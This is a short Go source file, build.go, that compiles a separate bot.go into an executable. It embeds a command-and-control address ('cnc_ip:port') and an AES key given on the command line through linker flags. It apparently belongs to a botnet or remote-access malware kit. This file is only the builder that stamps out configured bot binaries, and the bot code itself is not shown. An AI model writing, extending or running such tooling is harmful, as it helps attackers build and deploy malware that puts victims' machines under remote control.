// build.go
package main

import (
	"fmt"
	"os"
	"os/exec"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: build <cnc_ip:port> <aes_key> <output_exe>")
		return
	}

	cnc := os.Args[1]
	key := os.Args[2]
	out := os.Args[3]

	cmd := exec.Command("go", "build", "-o", out, "-ldflags",
		fmt.Sprintf("-X 'main.cncAddr=%s' -X 'main.aesKey=%s'", cnc, key), "bot.go")

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Run()
	if err != nil {
		fmt.Println("Build failed:", err)
	} else {
		fmt.Println("Build succeeded:", out)
	}
}
